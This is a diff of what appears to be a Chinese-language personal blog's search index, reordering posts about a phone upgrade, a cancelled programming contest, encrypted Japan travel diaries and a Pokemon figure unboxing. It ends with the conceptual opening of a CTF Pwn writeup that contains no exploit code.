@@ -112,6 +112,57 @@
       </categories>
   </entry>
   <entry>
+    <title>【週記】咦？好像踢到奇怪的盒子...</title>
+    <url>/2019/139b13e41c3f/</url>
+    <content><![CDATA[<p><img src="https://imgur.com/ODLyNTq.jpg"></p>
+<p>好像很久沒更新部落格www （跪<br>一方面是沒什麼趣事可以分享，另一方面是懶癌發作 XD<br>只好浮上來換口氣說說最近的事囉~</p>
+<p>另外用hexo框架更新網站偶爾會遇到<code>command not found: hexo</code><br>不得不說有點頭痛呢… 最近終於查清是<strong>Node.js</strong>的更新問題。<br>果然對於自己不熟悉的環境要找問題就不太容易呢~</p>
+<p>請容許我把解決方法放在這裡（其實就只是更新node版本<br><code>sudo npm install hexo-cli -g</code></p>
+<a id="more"></a>
+
+<p>首先。</p>
+<p>好像還是不少朋友很關心我未來研究所的去向www<br>但我只能說… 現在手上握著兩間的名額，沒辦法把話說死啊。</p>
+<p>總之，明天(3/11)正好是A研究所的二次報到（第一次是去年剛錄取要報到）。<br>至於B研究所呢～ 嗯看起來已經快被我放生Play呢 QQ</p>
+<hr>
+<p>再來就是！ 我換手機惹（撒花<br>不過換機的理由很薄弱… 就是家母用的Sony Z1(2013)要淘汰了。<br>我就見縫插針跟著提想換手機，現在想想真的是不知道哪來的勇氣www<br>（恰好我玩手遊常常過熱到閃退，當然我沒講出來 XD）</p>
+<p>至於挑手機呢… 嗯 我這人真的是平常不太關心手機動態。<br>等到要換了才開始每天追PTT的MobileComm的推文 (#</p>
+<p>在預算10k~15k(我自己有貼小錢ww) 的情況下。<br>最後是挑了高通845的 <strong>Zenfone 5Z 6G/128G (ZS620KL)</strong><br>個人自認需求不算高，平常也就滑滑fb、line、ptt，甚至連手遊都玩的很休閒www<br>（之前吃晚餐被抓包上次登入遊戲是13hr前，意思是早上滑完就沒開過= =+）</p>
+<p>沒想過身為索粉的我會有脫離SONY的一天 XD<br>畢竟前幾隻手機都是直接從SONY的機種挑… 但這次X1真的好長。<br>甚至還被戲稱遙控器www 真的怕口袋不夠深塞不下（Ｏ</p>
+<p>以往換手機我都還會在巴哈小屋po開箱文<br>至於5Z的開箱嘛，看起來好像沒什麼好開，反倒是Android 9要適應一陣子。<br>（之前的XZ只能更新到Android 8.0.0）</p>
+<p>就醬子吧，雖然很想把研究所心得貼出來。<br>無奈到現在我仍然還在猶豫，很討厭自己選擇障礙的個性QQ<br>可能會拆成兩篇，下週先放個&lt;上篇&gt;好了~~ （希望懶癌不要發作</p>
+]]></content>
+      <categories>
+        <category>敗家開箱</category>
+      </categories>
+      <tags>
+        <tag>手機</tag>
+        <tag>Asus 5Z</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【週記】ITSA桂冠賽 居...居然收掉了QQQ</title>
+    <url>/2019/afe31856848d/</url>
+    <content><![CDATA[<p><img src="https://imgur.com/jk3yUSX.jpg"></p>
+<p>2019 ITSA桂冠賽確定停辦… 事情總是如此地突然QQ<br>我們NUK去年好不容易稍稍帶起了競程風氣 沒想到時隔一年就收掉了<br>更何況是連線上賽都改成兩個月一次= =</p>
+<p>看來下屆社長要推動競程這塊會很辛苦呢 …</p>
+<a id="more"></a>
+
+<p>今年四月底我要飛日本。</p>
+<p>回想起去年訂機票還很怕會卡到ITSA桂冠賽。<br>特地寄信問官方舉辦時間，想當然爾… 沒有消息XD</p>
+<p>結果居然就這樣停辦了 欸…<br>這下子我在大學能參加的現場賽就差不多告個段落了。<br>之後可能找個時間可以開始補這四年的競程心得（前提是懶癌沒發作的話w）</p>
+<p>去年的桂冠賽我們校有20餘位同學出征，可以說是報名相當踴躍。<br>結果停辦後少一場能體驗”現場賽”的機會其實還蠻傷的，算下來大概只剩下NCPC、或是晉級Regional contest，真的蠻可惜的QQ</p>
+<p>話說既然連平常的 ITSA &amp; PTC 月賽都縮減成兩個月一次，自然聯想到的就是經費不足吧，其次就是PTC參與隊伍太少、又或是出題的題庫量不夠，嘛官方沒有講也只能就現況來猜了。</p>
+<p>另外除了一般的競賽，再來就是一年四次的CPE檢定。<br>這次很殘念地差一點拿六題，但值得一提的是曾經出現在PTC的edit distance這回成功寫出來了~<br>大學最後的CPE希望能拼個六題壓壓驚（跪ww</p>
+]]></content>
+      <categories>
+        <category>Algorithm</category>
+      </categories>
+      <tags>
+        <tag>ITSA桂冠賽</tag>
+        <tag>Programming Contest</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【活動】Codeforces April Fools Day Contest 2019</title>
     <url>/2019/db92dc9c53d3/</url>
     <content><![CDATA[<p>聽說是Codeforces每年都會辦的愚人節活動，今次算是體驗到何謂無厘頭解謎XD</p>
@@ -161,37 +212,9 @@
         <category>Algorithm</category>
       </categories>
       <tags>
+        <tag>Programming Contest</tag>
         <tag>Codeforces</tag>
         <tag>April Fools&#39; Day</tag>
-        <tag>Programming Contest</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【週記】咦？好像踢到奇怪的盒子...</title>
-    <url>/2019/139b13e41c3f/</url>
-    <content><![CDATA[<p><img src="https://imgur.com/ODLyNTq.jpg"></p>
-<p>好像很久沒更新部落格www （跪<br>一方面是沒什麼趣事可以分享，另一方面是懶癌發作 XD<br>只好浮上來換口氣說說最近的事囉~</p>
-<p>另外用hexo框架更新網站偶爾會遇到<code>command not found: hexo</code><br>不得不說有點頭痛呢… 最近終於查清是<strong>Node.js</strong>的更新問題。<br>果然對於自己不熟悉的環境要找問題就不太容易呢~</p>
-<p>請容許我把解決方法放在這裡（其實就只是更新node版本<br><code>sudo npm install hexo-cli -g</code></p>
-<a id="more"></a>
-
-<p>首先。</p>
-<p>好像還是不少朋友很關心我未來研究所的去向www<br>但我只能說… 現在手上握著兩間的名額，沒辦法把話說死啊。</p>
-<p>總之，明天(3/11)正好是A研究所的二次報到（第一次是去年剛錄取要報到）。<br>至於B研究所呢～ 嗯看起來已經快被我放生Play呢 QQ</p>
-<hr>
-<p>再來就是！ 我換手機惹（撒花<br>不過換機的理由很薄弱… 就是家母用的Sony Z1(2013)要淘汰了。<br>我就見縫插針跟著提想換手機，現在想想真的是不知道哪來的勇氣www<br>（恰好我玩手遊常常過熱到閃退，當然我沒講出來 XD）</p>
-<p>至於挑手機呢… 嗯 我這人真的是平常不太關心手機動態。<br>等到要換了才開始每天追PTT的MobileComm的推文 (#</p>
-<p>在預算10k~15k(我自己有貼小錢ww) 的情況下。<br>最後是挑了高通845的 <strong>Zenfone 5Z 6G/128G (ZS620KL)</strong><br>個人自認需求不算高，平常也就滑滑fb、line、ptt，甚至連手遊都玩的很休閒www<br>（之前吃晚餐被抓包上次登入遊戲是13hr前，意思是早上滑完就沒開過= =+）</p>
-<p>沒想過身為索粉的我會有脫離SONY的一天 XD<br>畢竟前幾隻手機都是直接從SONY的機種挑… 但這次X1真的好長。<br>甚至還被戲稱遙控器www 真的怕口袋不夠深塞不下（Ｏ</p>
-<p>以往換手機我都還會在巴哈小屋po開箱文<br>至於5Z的開箱嘛，看起來好像沒什麼好開，反倒是Android 9要適應一陣子。<br>（之前的XZ只能更新到Android 8.0.0）</p>
-<p>就醬子吧，雖然很想把研究所心得貼出來。<br>無奈到現在我仍然還在猶豫，很討厭自己選擇障礙的個性QQ<br>可能會拆成兩篇，下週先放個&lt;上篇&gt;好了~~ （希望懶癌不要發作</p>
-]]></content>
-      <categories>
-        <category>敗家開箱</category>
-      </categories>
-      <tags>
-        <tag>手機</tag>
-        <tag>Asus 5Z</tag>
       </tags>
   </entry>
   <entry>
@@ -281,29 +304,6 @@
       <tags>
         <tag>音Game</tag>
         <tag>April Fools&#39; Day</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【週記】ITSA桂冠賽 居...居然收掉了QQQ</title>
-    <url>/2019/afe31856848d/</url>
-    <content><![CDATA[<p><img src="https://imgur.com/jk3yUSX.jpg"></p>
-<p>2019 ITSA桂冠賽確定停辦… 事情總是如此地突然QQ<br>我們NUK去年好不容易稍稍帶起了競程風氣 沒想到時隔一年就收掉了<br>更何況是連線上賽都改成兩個月一次= =</p>
-<p>看來下屆社長要推動競程這塊會很辛苦呢 …</p>
-<a id="more"></a>
-
-<p>今年四月底我要飛日本。</p>
-<p>回想起去年訂機票還很怕會卡到ITSA桂冠賽。<br>特地寄信問官方舉辦時間，想當然爾… 沒有消息XD</p>
-<p>結果居然就這樣停辦了 欸…<br>這下子我在大學能參加的現場賽就差不多告個段落了。<br>之後可能找個時間可以開始補這四年的競程心得（前提是懶癌沒發作的話w）</p>
-<p>去年的桂冠賽我們校有20餘位同學出征，可以說是報名相當踴躍。<br>結果停辦後少一場能體驗”現場賽”的機會其實還蠻傷的，算下來大概只剩下NCPC、或是晉級Regional contest，真的蠻可惜的QQ</p>
-<p>話說既然連平常的 ITSA &amp; PTC 月賽都縮減成兩個月一次，自然聯想到的就是經費不足吧，其次就是PTC參與隊伍太少、又或是出題的題庫量不夠，嘛官方沒有講也只能就現況來猜了。</p>
-<p>另外除了一般的競賽，再來就是一年四次的CPE檢定。<br>這次很殘念地差一點拿六題，但值得一提的是曾經出現在PTC的edit distance這回成功寫出來了~<br>大學最後的CPE希望能拼個六題壓壓驚（跪ww</p>
-]]></content>
-      <categories>
-        <category>Algorithm</category>
-      </categories>
-      <tags>
-        <tag>Programming Contest</tag>
-        <tag>ITSA桂冠賽</tag>
       </tags>
   </entry>
   <entry>
@@ -602,9 +602,9 @@
       </tags>
   </entry>
   <entry>
-    <title>【遊記】2019 橫跨平成&amp;令和的日本行（中國篇）</title>
-    <url>/2019/27d84da5bd1d/</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Welcome to my blog, enter password to read." /><label>Welcome to my blog, enter password to read.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="fabe348236105af01d2af70f132143740e3f1b98c255b45edce884cac87a56fa">89607a19ce2dcdbdbf020a4df0a50d8ad6b6e93e99e8785ee71ce1e26f71ca17d7c3156f3482f0056d647ebfe71341459f78f351316862a82399709bc3f1b3a623750d8cd0b095f41429407a9b62fcb9ac438f644246614cfc64ab5d3b0851de2777d5b68ae46265c89b8e3bae9da632ec0be7fb6148512639ffa98d514c47226a7d73f29030fdff58a78b647e5f20f0b52e4da0ce2031a8e7f73e2f500822bdba1f5914f354f1fb8ba46adef7a0e198c3e895201dcb783ff55dd934bacc8c3a284b1ea714f1da1f64371133821b5d758eeeb11fdd698898e827de2e62516ebe075e46e9a7f61fffff2d0f3f71b5fb9fe3daccb4fe056c45878899408dd5874cdbe11aed8bda1f629b97d0f149cc9199ef3d4a710bb65af36131a85ca65900bc4f4e2fc8b3f6f91e86a546fe30dc8f11460fcee460e54f80bcf537e5f0c3127e7f9277c12d5ceaa7240a2414572cb12c38f188ec8797f7bb539b37c2ccebca35de2758ef72242d77af9646d65a5f9f1abe5f39e894af14c087bd04a45d8297533c8038923d8453b5570b3e9dab977a7f87b230391a9f1a168485e3dc899211813b7604e50388a59845c23be79a5d077b3831dace5d21c70b9be076d179777f569e891474fad717f52da15848311e15c1c7389b45796db60651bb209793f2a6a8fc533d8397c9f2466afadb45b1d84cfff00941b47fabb550482d6525406c59eaf3eec930ef4abb872dd52ad4a7743248c45d93e582ae2cb0924911d6b3736e28e13867be39e90d26bb9bb67b79c8e89668d350b6899a263c9cc8597e27b84cf27308d8252ebdf2aa281c212dd779b8ef4d79ddecd7db19eb9bd7431c19de74a8875af75a35afb51bf164b10bd9080b258853fa61a23c78d9a486e4194bc8cfeff02d7acd82f73e11e1791f00df55a64031fb36d8a8416d3d6a176dd52ef6f9e6da54885b2d6e617db269158d0da6330c29cce761f60bdb95624a488d11f801fd36a0195dd45b1a86a4205fec26964d138ff0a481a10bf4b67a0bc890071d51cfe2d922bf0822dab7fd3d9722eb84450f119fe1264d0f43ccc6ecd22cfeb3e61dd460fe4431808d15b4eaacad419976d5c44411c575ddf7733c84b797cdc0428d4be7ff5c85a28640d59b84377a3c1c18040efd60cfdaa8e00860ce9ba1c221bbf89afb5f573bc11740c664c79609c52dbb6adbde5954f994f5f473258d00e706df2c48ef3158076e05315c6a5df119d3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <title>【遊記】2019 橫跨平成&amp;令和的日本行（九州篇 下）</title>
+    <url>/2019/b4f59777a725/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Welcome to my blog, enter password to read." /><label>Welcome to my blog, enter password to read.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="75f71dfdc997db7960bb61adedc95f637b0452f5ed8a9ec0124c9e6a9e7b6a32">89607a19ce2dcdbdbf020a4df0a50d8ad6b6e93e99e8785ee71ce1e26f71ca17d7c3156f3482f0056d647ebfe71341454c5c0ceb5eb97157ec7f4a273474e1509c2cd53e7a30d4f38be1286c6dbae86aba2dd082a92d59f4d6a717b7ca092c516bee3a3ca25911039e5cdfca92dcb58221badfc9f14e0f96099a9bd6fe82fa8175521b0fc29a30169d0a69ca74b1581fa30aa6e570e1bfb74aeb4a597875d26b6583a2a2041a17c0a6f7f11eee632b6c8bb9d7dec6c969faa94e3b962d82498d0ed4be7282997a2c11ee61f830252785ce7731030a6a463bb8f5ebeea6562dc1c1ba9ad262165a14fcd287881ce9e0ca980dad276e820ddca78f463bef70e762bc145ec152d6950f57b684dde20a446eb6c0c93191a3d2c90bef174c9b8209e0c8261932c6dcdf8d2895dab3d57b76713b80bdea8a08a1810de6388fa1e8f8eb80c1f0c64e4ccf7913436ba7968ec321601cf0539fc0ecb1793e2590bf6779fba4afee402220849fa038affa468ff76223d627ae10cdf428a52bcc83ba606e0a0e2fa7c621340869b9973179fc2c172de87dcc5f054c15a62e0104a786b46e0421b804a601651a7d91af20b5119ed28cd541add1083b589b3a057bfcbd5179cd8b50abbc493ece5d29ec77ce551bad0ecc98835c02ea204299f2cddb30b7b6329304323c873a8481d14a24d31288107756e774fa4945fe754eae250d862fea37</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>旅遊日誌</category>
       </categories>
@@ -613,9 +613,9 @@
       </tags>
   </entry>
   <entry>
-    <title>【遊記】2019 橫跨平成&amp;令和的日本行（九州篇 下）</title>
-    <url>/2019/b4f59777a725/</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Welcome to my blog, enter password to read." /><label>Welcome to my blog, enter password to read.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="75f71dfdc997db7960bb61adedc95f637b0452f5ed8a9ec0124c9e6a9e7b6a32">89607a19ce2dcdbdbf020a4df0a50d8ad6b6e93e99e8785ee71ce1e26f71ca17d7c3156f3482f0056d647ebfe71341454c5c0ceb5eb97157ec7f4a273474e1509c2cd53e7a30d4f38be1286c6dbae86aba2dd082a92d59f4d6a717b7ca092c516bee3a3ca25911039e5cdfca92dcb58221badfc9f14e0f96099a9bd6fe82fa8175521b0fc29a30169d0a69ca74b1581fa30aa6e570e1bfb74aeb4a597875d26b6583a2a2041a17c0a6f7f11eee632b6c8bb9d7dec6c969faa94e3b962d82498d0ed4be7282997a2c11ee61f830252785ce7731030a6a463bb8f5ebeea6562dc1c1ba9ad262165a14fcd287881ce9e0ca980dad276e820ddca78f463bef70e762bc145ec152d6950f57b684dde20a446eb6c0c93191a3d2c90bef174c9b8209e0c8261932c6dcdf8d2895dab3d57b76713b80bdea8a08a1810de6388fa1e8f8eb80c1f0c64e4ccf7913436ba7968ec321601cf0539fc0ecb1793e2590bf6779fba4afee402220849fa038affa468ff76223d627ae10cdf428a52bcc83ba606e0a0e2fa7c621340869b9973179fc2c172de87dcc5f054c15a62e0104a786b46e0421b804a601651a7d91af20b5119ed28cd541add1083b589b3a057bfcbd5179cd8b50abbc493ece5d29ec77ce551bad0ecc98835c02ea204299f2cddb30b7b6329304323c873a8481d14a24d31288107756e774fa4945fe754eae250d862fea37</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <title>【遊記】2019 橫跨平成&amp;令和的日本行（中國篇）</title>
+    <url>/2019/27d84da5bd1d/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Welcome to my blog, enter password to read." /><label>Welcome to my blog, enter password to read.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="fabe348236105af01d2af70f132143740e3f1b98c255b45edce884cac87a56fa">89607a19ce2dcdbdbf020a4df0a50d8ad6b6e93e99e8785ee71ce1e26f71ca17d7c3156f3482f0056d647ebfe71341459f78f351316862a82399709bc3f1b3a623750d8cd0b095f41429407a9b62fcb9ac438f644246614cfc64ab5d3b0851de2777d5b68ae46265c89b8e3bae9da632ec0be7fb6148512639ffa98d514c47226a7d73f29030fdff58a78b647e5f20f0b52e4da0ce2031a8e7f73e2f500822bdba1f5914f354f1fb8ba46adef7a0e198c3e895201dcb783ff55dd934bacc8c3a284b1ea714f1da1f64371133821b5d758eeeb11fdd698898e827de2e62516ebe075e46e9a7f61fffff2d0f3f71b5fb9fe3daccb4fe056c45878899408dd5874cdbe11aed8bda1f629b97d0f149cc9199ef3d4a710bb65af36131a85ca65900bc4f4e2fc8b3f6f91e86a546fe30dc8f11460fcee460e54f80bcf537e5f0c3127e7f9277c12d5ceaa7240a2414572cb12c38f188ec8797f7bb539b37c2ccebca35de2758ef72242d77af9646d65a5f9f1abe5f39e894af14c087bd04a45d8297533c8038923d8453b5570b3e9dab977a7f87b230391a9f1a168485e3dc899211813b7604e50388a59845c23be79a5d077b3831dace5d21c70b9be076d179777f569e891474fad717f52da15848311e15c1c7389b45796db60651bb209793f2a6a8fc533d8397c9f2466afadb45b1d84cfff00941b47fabb550482d6525406c59eaf3eec930ef4abb872dd52ad4a7743248c45d93e582ae2cb0924911d6b3736e28e13867be39e90d26bb9bb67b79c8e89668d350b6899a263c9cc8597e27b84cf27308d8252ebdf2aa281c212dd779b8ef4d79ddecd7db19eb9bd7431c19de74a8875af75a35afb51bf164b10bd9080b258853fa61a23c78d9a486e4194bc8cfeff02d7acd82f73e11e1791f00df55a64031fb36d8a8416d3d6a176dd52ef6f9e6da54885b2d6e617db269158d0da6330c29cce761f60bdb95624a488d11f801fd36a0195dd45b1a86a4205fec26964d138ff0a481a10bf4b67a0bc890071d51cfe2d922bf0822dab7fd3d9722eb84450f119fe1264d0f43ccc6ecd22cfeb3e61dd460fe4431808d15b4eaacad419976d5c44411c575ddf7733c84b797cdc0428d4be7ff5c85a28640d59b84377a3c1c18040efd60cfdaa8e00860ce9ba1c221bbf89afb5f573bc11740c664c79609c52dbb6adbde5954f994f5f473258d00e706df2c48ef3158076e05315c6a5df119d3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>旅遊日誌</category>
       </categories>
@@ -924,55 +924,6 @@
       </categories>
   </entry>
   <entry>
-    <title>【開箱】MegaHouse 伊布家族... 啊~ 真香❤</title>
-    <url>/2019/3c3d75e01dcd/</url>
-    <content><![CDATA[<p><img src="https://i.imgur.com/KJCVMxF.jpg"></p>
-<p>身為伊布控，Pokemon本傳遊戲只要能練伊布當然都給牠練爆</p>
-<p>不過收模型倒是第一次… 老實說也沒收過就是，所以模型初開箱就獻給伊布家族了</p>
-<p>真的百看不膩，敲讚derrrrrr (⁎⁍̴̛ᴗ⁍̴̛⁎)‼</p>
-<a id="more"></a>
-
-
-
-<p>今年二月中旬，MegaHouse釋出這樣的消息… </p>
-<p>大約四月底左右開放預購，手指頭不聽使喚就訂下去了XD</p>
-<img width="400px" src="https://i.imgur.com/vMV9wyI.png" />
-
-
-
-<p>等到現在過了半年，都已經大學畢業換地方住了才收到<br>（日本八月發售，算是在意料之內…吧）</p>
-<p>因為本身並不是多專業的玩家，所以就簡單發個開箱文來聞香香w<br>不囉唆，直接看圖啦！！也可以右鍵點開大圖！！</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/LIQf7oJh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/fpO4jpdh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/cbI5AE8h.jpg"></div></div></div></div>
-
-<p>包裝的箱子真的是剛剛好，而且從外觀就能聞到香氣了（？？</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/nVd4TKRh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/DFIKySXh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/lUnFrY5h.jpg"></div></div></div></div>
-
-<p>拆拆拆～</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/pTVVxjuh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/rfL5q24h.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/Ib9CDfjh.jpg"></div></div></div></div>
-
-<p>拆拆拆～</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/HrgBn11h.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/wu7J8nCh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/3uq6os1h.jpg"></div></div></div></div>
-
-<p>拆拆拆～</p>
-<p>&nbsp;<br>下面這個小吊飾是限定特典，摸起來軟軟的捨不得掛包包QwQ<br><img src="https://i.imgur.com/IpSlLXWh.jpg"></p>
-<p>最後，來個旋轉四連拍~</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/FvzpHfjh.jpg"></div><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/xF5WlF9h.jpg"></div></div></div></div>
-
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/JPpkxIlh.jpg"></div><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/D5Bsxg7h.jpg"></div></div></div></div>
-
-<p>&nbsp;<br>&nbsp;<br>之後應該會找個時間買展示箱，希望可以保存好一點XD</p>
-<p><img src="https://i.imgur.com/QER6l2uh.jpg"></p>
-]]></content>
-      <categories>
-        <category>敗家開箱</category>
-      </categories>
-      <tags>
-        <tag>ACGN</tag>
-        <tag>Pokemon</tag>
-        <tag>MegaHouse G.E.M.EX Series</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【CTF】108年金盾獎決賽 麥當勞吃到飽 ฅ&#39;ω&#39;ฅ</title>
     <url>/2019/89142c9b7138/</url>
     <content><![CDATA[<p><img src="https://i.imgur.com/7cuYWZm.jpg"></p>
@@ -1064,7 +1015,7 @@
   <entry>
     <title>實驗室日誌 0x02</title>
     <url>/2020/ce7597b3b14f/</url>
-    <content><![CDATA[<p><img src="https://photos.smugmug.com/photos/i-hLgVtG8/0/61e17a31/M/i-hLgVtG8-L.png?70%25"><br>先偷渡個咱們MacacaHub隊徽，感謝翔君大力幫忙QwQ</p>
+    <content><![CDATA[<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618835101/blog-posts/misc/macacahub-logo.webp"><br>先偷渡個咱們MacacaHub隊徽，感謝翔君大力幫忙QwQ</p>
 <p>果然有個會畫畫的朋友很重要呢（點頭</p>
 <a id="more"></a>
 
@@ -1108,6 +1059,179 @@
       <categories>
         <category>實驗室日誌</category>
       </categories>
+  </entry>
+  <entry>
+    <title>【開箱】MegaHouse 伊布家族... 啊~ 真香❤</title>
+    <url>/2019/3c3d75e01dcd/</url>
+    <content><![CDATA[<p><img src="https://i.imgur.com/KJCVMxF.jpg"></p>
+<p>身為伊布控，Pokemon本傳遊戲只要能練伊布當然都給牠練爆</p>
+<p>不過收模型倒是第一次… 老實說也沒收過就是，所以模型初開箱就獻給伊布家族了</p>
+<p>真的百看不膩，敲讚derrrrrr (⁎⁍̴̛ᴗ⁍̴̛⁎)‼</p>
+<a id="more"></a>
+
+
+
+<p>今年二月中旬，MegaHouse釋出這樣的消息… </p>
+<p>大約四月底左右開放預購，手指頭不聽使喚就訂下去了XD</p>
+<img width="400px" src="https://i.imgur.com/vMV9wyI.png" />
+
+
+
+<p>等到現在過了半年，都已經大學畢業換地方住了才收到<br>（日本八月發售，算是在意料之內…吧）</p>
+<p>因為本身並不是多專業的玩家，所以就簡單發個開箱文來聞香香w<br>不囉唆，直接看圖啦！！也可以右鍵點開大圖！！</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/LIQf7oJh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/fpO4jpdh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/cbI5AE8h.jpg"></div></div></div></div>
+
+<p>包裝的箱子真的是剛剛好，而且從外觀就能聞到香氣了（？？</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/nVd4TKRh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/DFIKySXh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/lUnFrY5h.jpg"></div></div></div></div>
+
+<p>拆拆拆～</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/pTVVxjuh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/rfL5q24h.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/Ib9CDfjh.jpg"></div></div></div></div>
+
+<p>拆拆拆～</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/HrgBn11h.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/wu7J8nCh.jpg"></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img src="https://i.imgur.com/3uq6os1h.jpg"></div></div></div></div>
+
+<p>拆拆拆～</p>
+<p>&nbsp;<br>下面這個小吊飾是限定特典，摸起來軟軟的捨不得掛包包QwQ<br><img src="https://i.imgur.com/IpSlLXWh.jpg"></p>
+<p>最後，來個旋轉四連拍~</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/FvzpHfjh.jpg"></div><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/xF5WlF9h.jpg"></div></div></div></div>
+
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/JPpkxIlh.jpg"></div><div class="group-picture-column" style="width: 50%;"><img src="https://i.imgur.com/D5Bsxg7h.jpg"></div></div></div></div>
+
+<p>&nbsp;<br>&nbsp;<br>之後應該會找個時間買展示箱，希望可以保存好一點XD</p>
+<p><img src="https://i.imgur.com/QER6l2uh.jpg"></p>
+]]></content>
+      <categories>
+        <category>敗家開箱</category>
+      </categories>
+      <tags>
+        <tag>ACGN</tag>
+        <tag>Pokemon</tag>
+        <tag>MegaHouse G.E.M.EX Series</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>資安社課 Pwn basic(1)</title>
+    <url>/2020/3b1396cb8c61/</url>
+    <content><![CDATA[<p>經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D<br>原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文…</p>
+<p>先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手<br>一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考</p>
+<p>另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn<br>否則每次被問到我也不曉得怎麼解釋（抹臉</p>
+<p>不會解釋資安… 應該是我的問題才對Orz</p>
+<a id="more"></a>
+
+<p>“<strong>Pwn</strong>“，有人唸Costco、有人唸IKEA，總之我都唸 “胖” 或是 “碰” 。<br>常見做法就是針對程式內的漏洞進行攻擊(提權)，有種”<strong>player has been owned.</strong>“的意思！<br>也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺w<br>在CTF領域，Pwn基礎題通常是給你無權讀取的文字檔(flag)，希望你透過程式漏洞拿到root權限拿flag。</p>
